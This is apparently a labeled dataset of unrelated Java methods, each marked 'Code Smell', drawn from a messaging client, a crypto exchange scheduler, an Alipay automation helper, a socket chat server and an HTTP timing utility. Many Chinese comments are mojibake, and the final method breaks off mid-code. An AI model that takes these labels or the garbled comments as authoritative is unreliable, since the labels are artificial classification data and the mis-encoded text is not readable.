          if (!cacheFileFinal.delete()) {
            cacheFileFinal.deleteOnExit();
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      if (cacheFileTemp != null) {
        try {
          if (!cacheFileTemp.delete()) {
            cacheFileTemp.deleteOnExit();
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      if (cacheFileParts != null) {
        try {
          if (!cacheFileParts.delete()) {
            cacheFileParts.deleteOnExit();
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      if (cacheIvTemp != null) {
        try {
          if (!cacheIvTemp.delete()) {
            cacheIvTemp.deleteOnExit();
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      if (cacheFilePreload != null) {
        try {
          if (!cacheFilePreload.delete()) {
            cacheFilePreload.deleteOnExit();
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
    }
  }
);
}",1,Code Smell
"@Override public void onSuccess(SearchResults result){
  ArrayList<SearchResult> results=new ArrayList<>();
  if (result.accounts != null) {
    for (    Account acc : result.accounts)     results.add(new SearchResult(acc));
  }
  if (result.hashtags != null) {
    for (    Hashtag tag : result.hashtags)     results.add(new SearchResult(tag));
  }
  if (result.statuses != null) {
    Set<String> alreadyLoadedStatuses=data.stream().filter(r -> r.type == SearchResult.Type.STATUS).map(r -> r.status.id).collect(Collectors.toSet());
    for (    Status status : result.statuses) {
      if (!alreadyLoadedStatuses.contains(status.id))       results.add(new SearchResult(status));
    }
  }
  prevDisplayItems=new ArrayList<>(displayItems);
  unfilteredResults=results;
  boolean wasRefreshing=refreshing;
  onDataLoaded(filterSearchResults(results),type != null && !results.isEmpty());
  if (wasRefreshing)   list.scrollToPosition(0);
}",1,Code Smell
"private void setAvatar(MessageObject messageObject){
  if (messageObject == null) {
    return;
  }
  if (isAvatarVisible) {
    if (messageObject.customAvatarDrawable != null) {
      avatarImage.setImageBitmap(messageObject.customAvatarDrawable);
    }
 else     if (currentUser != null) {
      if (currentUser.photo != null) {
        currentPhoto=currentUser.photo.photo_small;
      }
 else {
        currentPhoto=null;
      }
      post(() -> {
        avatarDrawable.setInfo(currentUser);
        avatarImage.setForUserOrChat(currentUser,avatarDrawable,null,LiteMode.isEnabled(LiteMode.FLAGS_CHAT),VectorAvatarThumbDrawable.TYPE_SMALL);
      }
);
    }
 else     if (currentChat != null) {
      if (currentChat.photo != null) {
        currentPhoto=currentChat.photo.photo_small;
      }
 else {
        currentPhoto=null;
      }
      post(() -> {
        avatarDrawable.setInfo(currentChat);
        avatarImage.setForUserOrChat(currentChat,avatarDrawable);
      }
);
    }
 else     if (messageObject != null && messageObject.isSponsored()) {
      if (messageObject.sponsoredChatInvite != null && messageObject.sponsoredChatInvite.chat != null) {
        post(() -> {
          avatarDrawable.setInfo(messageObject.sponsoredChatInvite.chat);
          avatarImage.setForUserOrChat(messageObject.sponsoredChatInvite.chat,avatarDrawable);
        }
);
      }
 else {
        avatarDrawable.setInfo(messageObject.sponsoredChatInvite);
        if (messageObject.sponsoredChatInvite != null) {
          TLRPC.Photo photo=messageObject.sponsoredChatInvite.photo;
          if (photo != null) {
            avatarImage.setImage(ImageLocation.getForPhoto(photo.sizes.get(0),photo),""50_50"",avatarDrawable,null,null,0);
          }
        }
      }
    }
 else {
      currentPhoto=null;
      avatarDrawable.setInfo(messageObject.getFromChatId(),null,null);
      avatarImage.setImage(null,null,avatarDrawable,null,null,0);
    }
  }
 else {
    currentPhoto=null;
  }
}",1,Code Smell
"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  MutableRegressionInfo that=(MutableRegressionInfo)o;
  if (unknownCount == that.unknownCount && overallCount == that.overallCount) {
    for (    Map.Entry<String,MutableLong> e : countMap.entrySet()) {
      MutableLong other=that.countMap.get(e.getKey());
      if (other == null || (other.longValue() != e.getValue().longValue())) {
        return false;
      }
 else {
        if (!checkMutableDouble(maxMap.get(e.getKey()),that.maxMap.get(e.getKey()))) {
          return false;
        }
        if (!checkMutableDouble(minMap.get(e.getKey()),that.minMap.get(e.getKey()))) {
          return false;
        }
        if (!checkMutableDouble(meanMap.get(e.getKey()),that.meanMap.get(e.getKey()))) {
          return false;
        }
        if (!checkMutableDouble(sumSquaresMap.get(e.getKey()),that.sumSquaresMap.get(e.getKey()))) {
          return false;
        }
      }
    }
    return true;
  }
 else {
    return false;
  }
}
",1,Code Smell
"public void playEmojiSound(AccountInstance accountInstance,String emoji,MessagesController.EmojiSound sound,boolean loadOnly){
  if (sound == null) {
    return;
  }
  Utilities.stageQueue.postRunnable(() -> {
    TLRPC.Document document=new TLRPC.TL_document();
    document.access_hash=sound.accessHash;
    document.id=sound.id;
    document.mime_type=""sound/ogg"";
    document.file_reference=sound.fileReference;
    document.dc_id=accountInstance.getConnectionsManager().getCurrentDatacenterId();
    File file=FileLoader.getInstance(accountInstance.getCurrentAccount()).getPathToAttach(document,true);
    if (file.exists()) {
      if (loadOnly) {
        return;
      }
      AndroidUtilities.runOnUIThread(() -> {
        try {
          int tag=++emojiSoundPlayerNum;
          if (emojiSoundPlayer != null) {
            emojiSoundPlayer.releasePlayer(true);
          }
          emojiSoundPlayer=new VideoPlayer(false);
          emojiSoundPlayer.setDelegate(new VideoPlayer.VideoPlayerDelegate(){
            @Override public void onStateChanged(            boolean playWhenReady,            int playbackState){
              AndroidUtilities.runOnUIThread(() -> {
                if (tag != emojiSoundPlayerNum) {
                  return;
                }
                if (playbackState == ExoPlayer.STATE_ENDED) {
                  if (emojiSoundPlayer != null) {
                    try {
                      emojiSoundPlayer.releasePlayer(true);
                      emojiSoundPlayer=null;
                    }
 catch (                    Exception e) {
                      FileLog.e(e);
                    }
                  }
                }
              }
);
            }
            @Override public void onError(            VideoPlayer player,            Exception e){
            }
            @Override public void onVideoSizeChanged(            int width,            int height,            int unappliedRotationDegrees,            float pixelWidthHeightRatio){
            }
            @Override public void onRenderedFirstFrame(){
            }
            @Override public void onSurfaceTextureUpdated(            SurfaceTexture surfaceTexture){
            }
            @Override public boolean onSurfaceDestroyed(            SurfaceTexture surfaceTexture){
              return false;
            }
          }
);
          emojiSoundPlayer.preparePlayer(Uri.fromFile(file),""other"");
          emojiSoundPlayer.setStreamType(AudioManager.STREAM_MUSIC);
          emojiSoundPlayer.play();
        }
 catch (        Exception e) {
          FileLog.e(e);
          if (emojiSoundPlayer != null) {
            emojiSoundPlayer.releasePlayer(true);
            emojiSoundPlayer=null;
          }
        }
      }
);
    }
 else {
      AndroidUtilities.runOnUIThread(() -> accountInstance.getFileLoader().loadFile(document,null,FileLoader.PRIORITY_NORMAL,1));
    }
  }
);
}",1,Code Smell
"private void initOrUpdateSink(InlongStreamInfo streamInfo){
  List<StreamSink> streamSinks=sinkClient.listSinks(inlongGroupId,inlongStreamId);
  List<String> updateSinkNames=Lists.newArrayList();
  for (  StreamSink sink : streamSinks) {
    final String sinkName=sink.getSinkName();
    final int id=sink.getId();
    if (this.streamSinks.get(sinkName) != null) {
      StreamSink streamSink=this.streamSinks.get(sinkName);
      streamSink.setId(id);
      streamSink.setInlongGroupId(streamInfo.getInlongGroupId());
      streamSink.setInlongStreamId(streamInfo.getInlongStreamId());
      streamSink.setVersion(sink.getVersion());
      Pair<Boolean,String> updateState=sinkClient.updateSink(streamSink.genSinkRequest());
      if (!updateState.getKey()) {
        throw new RuntimeException(String.format(""Update sink=%s failed with err=%s"",streamSink,updateState.getValue()));
      }
      updateSinkNames.add(sinkName);
    }
 else     if (sinksToDelete.contains(sinkName)) {
      if (!sinkClient.deleteSink(id)) {
        throw new RuntimeException(String.format(""Delete sink=%s failed"",sink));
      }
    }
  }
  for (  Map.Entry<String,StreamSink> sinkEntry : this.streamSinks.entrySet()) {
    String sinkName=sinkEntry.getKey();
    if (updateSinkNames.contains(sinkName)) {
      continue;
    }
    StreamSink streamSink=sinkEntry.getValue();
    streamSink.setInlongGroupId(streamInfo.getInlongGroupId());
    streamSink.setInlongStreamId(streamInfo.getInlongStreamId());
    sinkClient.createSink(streamSink.genSinkRequest());
  }
}
",1,Code Smell
"/** 
 * 妫�鏌ュ苟鑾峰彇鏃堕棿, 闂撮殧鐨勪紭鍏堢骇鏇撮珮
 * @param startTime 寮�濮嬫椂闂�
 * @param endTime   缁撴潫鏃堕棿
 * @param interval  缁熻闂撮殧
 * @return 杩斿洖String绫诲瀷鐨勬棩鏈熸暟缁勶紝[寮�濮嬫椂闂达紝缁撴潫鏃堕棿]
 */
public String[] checkTime(String startTime,String endTime,String interval){
  if (StrUtil.isBlank(interval)) {
    if (StrUtil.isBlank(startTime)) {
      throw new XzException400(""鏈寚瀹氶棿闅�(interval)鏃�,寮�濮嬫棩鏈熶负蹇呭～椤�"");
    }
    if (StrUtil.isBlank(endTime)) {
      throw new XzException400(""鏈寚瀹氶棿闅�(interval)鏃�,缁撴潫鏃ユ湡涓哄繀濉」"");
    }
  }
  return this.checkTime(startTime,endTime,interval,null);
}
/** 
 * 妫�鏌ュ苟鑾峰彇鏃堕棿
 * @param interval 缁熻闂撮殧
 * @return 杩斿洖String绫诲瀷鐨勬棩鏈熸暟缁勶紝[寮�濮嬫椂闂达紝缁撴潫鏃堕棿]
 */
public String[] checkTime(String interval){
  if (StrUtil.isBlank(interval)) {
    throw new XzException400(""缁熻闂撮殧(interval)涓哄繀濉」"");
  }
  return this.checkTime(null,null,interval,null);
}
/** 
 * 妫�鏌ュ苟鑾峰彇鏃堕棿
 * @param offsetHour 鏃ユ湡鍋忕Щ閲忥紝閫氬父鏄竴涓礋鏁帮紝浼氳幏寰椾竴涓猍褰撳墠鏃堕棿+鍋忕Щ閲忥紝褰撳墠鏃堕棿]鏍煎紡鐨勬棩鏈�
 * @return 杩斿洖String绫诲瀷鐨勬棩鏈熸暟缁勶紝[褰撳墠鏃堕棿+offsetHour锛屽綋鍓嶆椂闂碷
 */
public String[] checkTime(Integer offsetHour){
  return this.checkTime(null,null,null,offsetHour);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@19a26d4e",1,Code Smell
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (innerDataset_ != null) {
    output.writeMessage(1,getInnerDataset());
  }
  if (featureDomain_ != null) {
    output.writeMessage(2,getFeatureDomain());
  }
  if (outputDomain_ != null) {
    output.writeMessage(3,getOutputDomain());
  }
  if (size_ != 0) {
    output.writeInt32(4,size_);
  }
  if (getIndicesList().size() > 0) {
    output.writeUInt32NoTag(42);
    output.writeUInt32NoTag(indicesMemoizedSerializedSize);
  }
  for (int i=0; i < indices_.size(); i++) {
    output.writeInt32NoTag(indices_.getInt(i));
  }
  if (seed_ != 0L) {
    output.writeInt64(6,seed_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(tag_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,7,tag_);
  }
  if (sampled_ != false) {
    output.writeBool(8,sampled_);
  }
  if (weighted_ != false) {
    output.writeBool(9,weighted_);
  }
  if (storeIndices_ != false) {
    output.writeBool(10,storeIndices_);
  }
  unknownFields.writeTo(output);
}",1,Code Smell
"public void processLoadedMenuBots(TLRPC.TL_attachMenuBots bots,long hash,int date,boolean cache){
  if (bots != null && date != 0) {
    attachMenuBots=bots;
    menuBotsUpdateHash=hash;
  }
  getMessagesController().getMainSettings().edit().putInt(""menuBotsUpdateDate"",menuBotsUpdateDate=date).commit();
  menuBotsUpdatedLocal=true;
  boolean forceReload=false;
  if (bots != null) {
    if (!cache) {
      getMessagesStorage().putUsersAndChats(bots.users,null,true,true);
    }
    getMessagesController().putUsers(bots.users,cache);
    AndroidUtilities.runOnUIThread(() -> NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.attachMenuBotsDidLoad));
    for (int i=0; i < bots.bots.size(); i++) {
      if (bots.bots.get(i) instanceof TLRPC.TL_attachMenuBot_layer162) {
        bots.bots.get(i).show_in_attach_menu=true;
        forceReload=true;
      }
    }
  }
  if (!cache) {
    putMenuBotsToCache(bots,hash,date);
  }
 else   if (forceReload || Math.abs(System.currentTimeMillis() / 1000 - date) >= 60 * 60) {
    loadAttachMenuBots(false,true);
  }
}",1,Code Smell
"@TargetApi(Build.VERSION_CODES.O) public static boolean updateExistingShortcuts(Context context,Resources resources){
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
    return true;
  }
  LOGGER.d(""updateExistingShortcuts"");
  boolean hasDynamic=false;
  boolean hasLegacy=false;
  boolean shouldUpdate=false;
  ShortcutManager shortcutManager=context.getSystemService(ShortcutManager.class);
  List<ShortcutInfo> existingShortcuts;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
    existingShortcuts=shortcutManager.getShortcuts(ShortcutManager.FLAG_MATCH_PINNED | ShortcutManager.FLAG_MATCH_DYNAMIC);
  }
 else {
    existingShortcuts=new ArrayList<>();
    existingShortcuts.addAll(shortcutManager.getDynamicShortcuts());
    existingShortcuts.addAll(shortcutManager.getPinnedShortcuts());
  }
  for (  ShortcutInfo shortcutInfo : existingShortcuts) {
    String id=shortcutInfo.getId();
    if (""rikka.sui.SUI"".equals(id)) {
      hasLegacy=true;
      continue;
    }
    if (!SHORTCUT_ID.equals(id)) {
      continue;
    }
    if (shortcutInfo.isDynamic()) {
      hasDynamic=true;
    }
    Intent intent=shortcutInfo.getIntent();
    if (intent == null) {
      continue;
    }
    if (!intent.hasExtra(SHORTCUT_EXTRA)) {
      LOGGER.i(""Update shortcut %s since it does not have extra"",id);
      shouldUpdate=true;
    }
  }
  if (hasLegacy) {
    List<String> shortcutsToRemove=new ArrayList<>();
    shortcutsToRemove.add(""rikka.sui.SUI"");
    shortcutManager.removeDynamicShortcuts(shortcutsToRemove);
    int id=resources.getIdentifier(""shortcut_is_out_dated"",""string"",""rikka.sui"");
    if (id != 0) {
      shortcutManager.disableShortcuts(shortcutsToRemove,resources.getString(id));
    }
 else {
      shortcutManager.disableShortcuts(shortcutsToRemove);
    }
  }
  if (shouldUpdate) {
    List<ShortcutInfo> shortcutsToUpdate=new ArrayList<>();
    shortcutsToUpdate.add(createShortcut(context,resources));
    boolean res=shortcutManager.updateShortcuts(shortcutsToUpdate);
    LOGGER.v(""updateShortcuts: %s"",Boolean.toString(res));
  }
  return hasDynamic;
}",1,Code Smell
"private static void join(ClassLoader loader,JSONArray allPathBaseInfoList,JSONArray otherAllPathBaseInfoList,String firstJoinPathTitle){
  try {
    int index=-1;
    String title=null;
    String pathId=null;
    JSONObject jo=new JSONObject();
    for (int i=allPathBaseInfoList.length() - 1; i >= 0; i--) {
      jo=allPathBaseInfoList.getJSONObject(i);
      if (jo.getBoolean(""unlocked"")) {
        title=jo.getString(""title"");
        pathId=jo.getString(""pathId"");
        index=i;
        break;
      }
    }
    if (index < 0 || index == allPathBaseInfoList.length() - 1) {
      for (int j=otherAllPathBaseInfoList.length() - 1; j >= 0; j--) {
        jo=otherAllPathBaseInfoList.getJSONObject(j);
        if (jo.getBoolean(""unlocked"")) {
          if (j != otherAllPathBaseInfoList.length() - 1 || index != allPathBaseInfoList.length() - 1) {
            title=jo.getString(""title"");
            pathId=jo.getString(""pathId"");
            index=j;
          }
          break;
        }
      }
    }
    if (index >= 0) {
      String s;
      if (title.equals(firstJoinPathTitle)) {
        s=AntSportsRpcCall.openAndJoinFirst();
      }
 else {
        s=AntSportsRpcCall.join(pathId);
      }
      jo=new JSONObject(s);
      if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
        Log.other(""鍔犲叆绾胯矾馃毝馃徎鈥嶁檪锔廩"" + title + ""]"");
        queryMyHomePage(loader);
      }
 else {
        Log.i(TAG,jo.getString(""resultDesc""));
      }
    }
 else {
      Log.recordLog(""濂藉儚娌℃湁鍙蛋鐨勭嚎璺簡锛�"","""");
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""join err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public void run(String... args) throws Exception {
  SystemConfig systemConfig=systemGeneralConfigService.getConfig();
  if (systemConfig != null) {
    if (systemConfig.getTimeZoneId() != null) {
      TimeZone.setDefault(TimeZone.getTimeZone(systemConfig.getTimeZoneId()));
    }
    if (systemConfig.getLocale() != null) {
      String[] arr=systemConfig.getLocale().split(CommonConstants.LOCALE_SEPARATOR);
      if (arr.length == LANG_REGION_LENGTH) {
        String language=arr[0];
        String country=arr[1];
        Locale.setDefault(new Locale(language,country));
      }
    }
  }
 else {
    systemConfig=SystemConfig.builder().timeZoneId(TimeZone.getDefault().getID()).locale(Locale.getDefault().getLanguage() + CommonConstants.LOCALE_SEPARATOR + Locale.getDefault().getCountry()).build();
    String contentJson=objectMapper.writeValueAsString(systemConfig);
    GeneralConfig generalConfig2Save=GeneralConfig.builder().type(systemGeneralConfigService.type()).content(contentJson).build();
    generalConfigDao.save(generalConfig2Save);
  }
  TemplateConfig templateConfig=templateConfigService.getConfig();
  appService.updateCustomTemplateConfig(templateConfig);
  if (DEFAULT_JWT_SECRET.equals(currentJwtSecret)) {
    SystemSecret systemSecret=systemSecretService.getConfig();
    if (systemSecret == null || !StringUtils.hasText(systemSecret.getJwtSecret())) {
      char[] chars=DEFAULT_JWT_SECRET.toCharArray();
      Random rand=new Random();
      for (int i=0; i < chars.length; i++) {
        int index=rand.nextInt(chars.length);
        char temp=chars[i];
        chars[i]=chars[index];
        chars[index]=temp;
      }
      currentJwtSecret=new String(chars);
      systemSecret=SystemSecret.builder().jwtSecret(currentJwtSecret).build();
      systemSecretService.saveConfig(systemSecret);
    }
 else {
      currentJwtSecret=systemSecret.getJwtSecret();
    }
  }
  JsonWebTokenUtil.setDefaultSecretKey(currentJwtSecret);
}",1,Code Smell
"/** 
 * Attempt to break the item on this itemstack into a type/variant/colour which we can use for communication with the Malmo platform.
 * @param is the ItemStack containing the item we are attempting to deconstruct.
 * @return an XML DrawItem object containing the item's type, variant, colour etc.
 */
public static DrawItem getDrawItemFromItemStack(ItemStack is){
  if (is == null)   return null;
  DrawItem di=new DrawItem();
  String name=is.getUnlocalizedName();
  if (is.getHasSubtypes()) {
    List<String> itemParts=new ArrayList<String>(Arrays.asList(name.split(""\\."")));
    if (is.getItem() instanceof ItemMonsterPlacer) {
      itemParts.add(ItemMonsterPlacer.getNamedIdFrom(is).toString());
    }
    Colour col=null;
    Variation var=null;
    for (int part=2; part < itemParts.size(); part++) {
      String section=itemParts.get(part);
      if (col == null) {
        col=attemptToGetAsColour(section);
        if (col == null && var == null)         var=attemptToGetAsVariant(section,is);
      }
 else       if (var == null)       var=attemptToGetAsVariant(section,is);
    }
    di.setColour(col);
    di.setVariant(var);
  }
  Object obj=Item.REGISTRY.getNameForObject(is.getItem());
  String publicName;
  if (obj instanceof ResourceLocation)   publicName=((ResourceLocation)obj).getResourcePath();
 else   publicName=obj.toString();
  di.setType(publicName);
  return di;
}",1,Code Smell
"@Nullable private File getUpdatedDexFile(@NonNull Map<String,List<Action>> actionList) throws IOException {
  if (!Objects.requireNonNull(getOptions()).readWrite || actionList.isEmpty()) {
    return null;
  }
  String extension=getFile().getExtension();
  File file=FileCache.getGlobalFileCache().createCachedFile(extension);
  Map<String,ClassInfo> classInfoMap=new HashMap<>();
  for (  String className : Objects.requireNonNull(mDexClasses).getClassNames()) {
    classInfoMap.put(File.separator + className,new ClassInfo(null,true));
  }
  for (  String path : actionList.keySet()) {
    List<Action> actions=actionList.get(path);
    if (actions == null)     continue;
    for (    Action action : actions) {
      Node<?> targetNode=action.targetNode;
switch (action.action) {
case ACTION_CREATE:
        classInfoMap.put(targetNode.getFullPath(),new ClassInfo(null,false,targetNode.isDirectory()));
      break;
case ACTION_DELETE:
    classInfoMap.remove(targetNode.getFullPath());
  break;
case ACTION_UPDATE:
{
  File cachedFile=Objects.requireNonNull(action.getCachedPath());
  String targetPath=targetNode.getFullPath();
  ClassInfo classInfo=classInfoMap.get(targetPath);
  classInfoMap.put(targetPath,new ClassInfo(cachedFile,classInfo != null && classInfo.physical));
  break;
}
case ACTION_MOVE:
String sourcePath=Objects.requireNonNull(action.getSourcePath());
ClassInfo classInfo=classInfoMap.get(sourcePath);
if (classInfo != null) {
classInfoMap.put(targetNode.getFullPath(),classInfo);
}
 else {
classInfoMap.put(targetNode.getFullPath(),new ClassInfo(null,false,targetNode.isDirectory()));
}
classInfoMap.remove(sourcePath);
break;
}
}
}
List<String> paths=new ArrayList<>(classInfoMap.keySet());
Collections.sort(paths);
List<ClassDef> classDefList=new ArrayList<>(paths.size());
for (String path : paths) {
String className=path.substring(1);
ClassInfo classInfo=Objects.requireNonNull(classInfoMap.get(path));
if (classInfo.directory) {
continue;
}
if (classInfo.cachedFile != null) {
try {
classDefList.add(DexUtils.toClassDef(classInfo.cachedFile,getApiLevel()));
}
 catch (RecognitionException e) {
throw new IOException(e);
}
continue;
}
if (classInfo.physical) {
try {
classDefList.add(mDexClasses.getClassDef(className));
}
 catch (ClassNotFoundException e) {
throw new IOException(e);
}
}
}
DexUtils.storeDex(classDefList,new FileDataStore(file),getApiLevel());
return file;
}",1,Code Smell
"public static void main(String[] args) throws IOException {
  ServerSocketChannel serverSocketChannel=ServerSocketChannel.open();
  serverSocketChannel.configureBlocking(false);
  serverSocketChannel.bind(new InetSocketAddress(8080));
  Selector selector=Selector.open();
  serverSocketChannel.register(selector,SelectionKey.OP_ACCEPT);
  System.out.println(""鑱婂ぉ瀹ゆ湇鍔＄鍚姩浜"");
  AtomicReference<SocketChannel> clientRef=new AtomicReference<>();
  Thread sendMessageThread=new Thread(() -> {
    try (BufferedReader reader=new BufferedReader(new InputStreamReader(System.in))){
      while (true) {
        System.out.println(""杈撳叆鏈嶅姟鍣ㄧ娑堟伅: "");
        String message=reader.readLine();
        SocketChannel client=clientRef.get();
        if (client != null && client.isConnected()) {
          ByteBuffer buffer=ByteBuffer.wrap((message + ""\n"").getBytes());
          client.write(buffer);
        }
      }
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
);
  sendMessageThread.start();
  while (true) {
    int readyChannels=selector.select();
    if (readyChannels == 0) {
      continue;
    }
    Set<SelectionKey> selectedKeys=selector.selectedKeys();
    Iterator<SelectionKey> keyIterator=selectedKeys.iterator();
    while (keyIterator.hasNext()) {
      SelectionKey key=keyIterator.next();
      if (key.isAcceptable()) {
        SocketChannel client=serverSocketChannel.accept();
        System.out.println(""瀹㈡埛绔凡杩炴帴"");
        client.configureBlocking(false);
        client.register(selector,SelectionKey.OP_READ);
        clientRef.set(client);
      }
 else       if (key.isReadable()) {
        SocketChannel channel=(SocketChannel)key.channel();
        ByteBuffer buffer=ByteBuffer.allocate(1024);
        int bytesRead=channel.read(buffer);
        if (bytesRead > 0) {
          buffer.flip();
          byte[] bytes=new byte[buffer.remaining()];
          buffer.get(bytes);
          String message=new String(bytes).trim();
          System.out.println(""瀹㈡埛绔秷鎭: "" + message);
        }
      }
      keyIterator.remove();
    }
  }
}",1,Code Smell
"public void updatePremiumButtonText(){
  if (type == TYPE_BOOSTS_FOR_USERS || type == TYPE_BOOSTS_FOR_REMOVE_RESTRICTIONS || isMiniBoostBtnForAdminAvailable()) {
    if (BoostRepository.isMultiBoostsAvailable()) {
      premiumButtonView.buttonTextView.setText(canApplyBoost != null && canApplyBoost.alreadyActive ? LocaleController.getString(""BoostingBoostAgain"",R.string.BoostingBoostAgain) : LocaleController.getString(isGroup() ? R.string.BoostGroup : R.string.BoostChannel));
      if (canApplyBoost != null && canApplyBoost.isMaxLvl) {
        premiumButtonView.buttonTextView.setText(LocaleController.getString(""OK"",R.string.OK));
      }
    }
 else {
      premiumButtonView.buttonTextView.setText(LocaleController.getString(isGroup() ? R.string.BoostGroup : R.string.BoostChannel));
    }
  }
 else   if (type == TYPE_BOOSTS_FOR_POSTING || type == TYPE_BOOSTS_FOR_COLOR || type == TYPE_BOOSTS_FOR_PROFILE_COLOR || type == TYPE_BOOSTS_FOR_EMOJI_STATUS || type == TYPE_BOOSTS_FOR_CUSTOM_EMOJI_PACK || type == TYPE_BOOSTS_FOR_WALLPAPER || type == TYPE_BOOSTS_FOR_CUSTOM_WALLPAPER || type == TYPE_BOOSTS_FOR_REACTIONS || type == TYPE_BOOSTS_FOR_REPLY_ICON || type == TYPE_BOOSTS_FOR_PROFILE_ICON || type == TYPE_BOOSTS_FOR_ADS) {
    SpannableStringBuilder spannableStringBuilder=new SpannableStringBuilder(""d "");
    spannableStringBuilder.setSpan(new ColoredImageSpan(R.drawable.msg_copy_filled),0,1,0);
    spannableStringBuilder.append(LocaleController.getString(""CopyLink"",R.string.CopyLink));
    premiumButtonView.buttonTextView.setText(spannableStringBuilder);
  }
 else   if (UserConfig.getInstance(currentAccount).isPremium() || MessagesController.getInstance(currentAccount).premiumFeaturesBlocked() || isVeryLargeFile) {
    premiumButtonView.buttonTextView.setText(LocaleController.getString(""OK"",R.string.OK));
    premiumButtonView.hideIcon();
  }
 else {
    premiumButtonView.buttonTextView.setText(LocaleController.getString(""IncreaseLimit"",R.string.IncreaseLimit));
    if (limitParams != null) {
      if (limitParams.defaultLimit + 1 == limitParams.premiumLimit) {
        premiumButtonView.setIcon(R.raw.addone_icon);
      }
 else       if (limitParams.defaultLimit != 0 && limitParams.premiumLimit != 0 && limitParams.premiumLimit / (float)limitParams.defaultLimit >= 1.6f && limitParams.premiumLimit / (float)limitParams.defaultLimit <= 2.5f) {
        premiumButtonView.setIcon(R.raw.double_icon);
      }
 else {
        premiumButtonView.hideIcon();
      }
    }
 else {
      premiumButtonView.hideIcon();
    }
  }
}",1,Code Smell
"String getFileName(int index);
private String getFileName(int index){
  if (index < 0) {
    return null;
  }
  if (!secureDocuments.isEmpty()) {
    if (index >= secureDocuments.size()) {
      return null;
    }
    SecureDocument location=secureDocuments.get(index);
    return location.secureFile.dc_id + ""_"" + location.secureFile.id+ "".jpg"";
  }
 else   if (!imagesArrLocations.isEmpty() || !imagesArr.isEmpty()) {
    if (!imagesArrLocations.isEmpty()) {
      if (index >= imagesArrLocations.size()) {
        return null;
      }
      ImageLocation location=imagesArrLocations.get(index);
      ImageLocation videoLocation=imagesArrLocationsVideo.get(index);
      if (location == null) {
        return null;
      }
      if (videoLocation != location) {
        return videoLocation.location.volume_id + ""_"" + videoLocation.location.local_id+ "".mp4"";
      }
 else {
        return location.location.volume_id + ""_"" + location.location.local_id+ "".jpg"";
      }
    }
 else {
      if (index >= imagesArr.size()) {
        return null;
      }
      return FileLoader.getMessageFileName(imagesArr.get(index).messageOwner);
    }
  }
 else   if (!imagesArrLocals.isEmpty()) {
    if (index >= imagesArrLocals.size()) {
      return null;
    }
    Object object=imagesArrLocals.get(index);
    if (object instanceof MediaController.SearchImage) {
      MediaController.SearchImage searchImage=((MediaController.SearchImage)object);
      return searchImage.getAttachName();
    }
 else     if (object instanceof TLRPC.BotInlineResult) {
      TLRPC.BotInlineResult botInlineResult=(TLRPC.BotInlineResult)object;
      if (botInlineResult.document != null) {
        return FileLoader.getAttachFileName(botInlineResult.document);
      }
 else       if (botInlineResult.photo != null) {
        TLRPC.PhotoSize sizeFull=FileLoader.getClosestPhotoSizeWithSize(botInlineResult.photo.sizes,AndroidUtilities.getPhotoSize());
        return FileLoader.getAttachFileName(sizeFull);
      }
 else       if (botInlineResult.content instanceof TLRPC.TL_webDocument) {
        return Utilities.MD5(botInlineResult.content.url) + ""."" + ImageLoader.getHttpUrlExtension(botInlineResult.content.url,FileLoader.getMimeTypePart(botInlineResult.content.mime_type));
      }
    }
  }
 else   if (pageBlocksAdapter != null) {
    return pageBlocksAdapter.getFileName(index);
  }
  return null;
}",1,Code Smell
"/** 
 * 姣�2鍒嗛挓杩愯(妫�鏌ユ槸鍚︽湁瓒呮椂鏈鐞嗚鍗曪級
 */
@Scheduled(cron=""0 */2 * * * *"") public void checkIfHasExpiredOrder(){
  List<CtcOrder> orderList0=ctcOrderService.findAllByStatus(0);
  List<CtcOrder> orderList1=ctcOrderService.findAllByStatus(1);
  Date currentDate=DateUtil.getCurrentDate();
  for (  CtcOrder order : orderList0) {
    if (currentDate.getTime() - order.getCreateTime().getTime() > 2100000) {
      if (order.getDirection() == 1) {
        MemberWallet memberWallet=memberWalletService.findByCoinUnitAndMemberId(order.getUnit(),order.getMember().getId());
        if (memberWallet == null) {
          continue;
        }
        if (memberWallet.getFrozenBalance().compareTo(order.getAmount()) < 0) {
          continue;
        }
        memberWalletService.thawBalance(memberWallet,order.getAmount());
      }
      order.setStatus(4);
      order.setCancelReason(""瓒呮椂绯荤粺鑷姩鍙栨秷"");
      order.setCancelTime(DateUtil.getCurrentDate());
      ctcOrderService.saveAndFlush(order);
    }
  }
  for (  CtcOrder order : orderList1) {
    if (order.getStatus() == 1 && order.getDirection() == 0) {
      if (currentDate.getTime() - order.getConfirmTime().getTime() > 2100000) {
        order.setStatus(4);
        order.setCancelReason(""瓒呮椂绯荤粺鑷姩鍙栨秷"");
        order.setCancelTime(DateUtil.getCurrentDate());
        ctcOrderService.saveAndFlush(order);
      }
    }
  }
}",1,Code Smell
"public static int getRequestDelay(HttpRequestInfo httpRequestInfo,String cookieValue){
  int delay=0;
  long startTime=System.currentTimeMillis();
  HttpURLConnection connection=null;
  try {
    if (config.isProxyEnabled()) {
      Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(config.getProxyIP(),config.getProxyPort()));
      connection=(HttpURLConnection)new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);
    }
 else {
      connection=(HttpURLConnection)new URL(httpRequestInfo.getRequestURL()).openConnection();
    }
    connection.setRequestMethod(httpRequestInfo.getRequestMethod());
    if (httpRequestInfo.getHeaders().size() == 0) {
